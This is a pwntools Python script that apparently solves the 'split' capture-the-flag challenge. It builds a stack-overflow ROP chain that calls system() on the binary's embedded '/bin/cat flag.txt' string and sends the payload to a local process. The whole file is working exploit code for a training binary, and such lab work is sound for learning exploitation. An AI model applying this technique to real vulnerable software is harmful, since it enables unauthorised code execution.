#!/usr/bin/python3
from pwn import *

binary = context.binary = ELF('split')
# context.terminal = ['termite', '-e']

cat_flag = [i for i in binary.search(b'/bin/cat flag.txt')][0]
r = ROP(binary)

r.system(cat_flag)
inp = cyclic(40) + r.chain()

p = process(binary.path)
# gdb.attach(p, 'b *pwnme+80')

p.sendlineafter(b'> ', inp)

print(p.read())
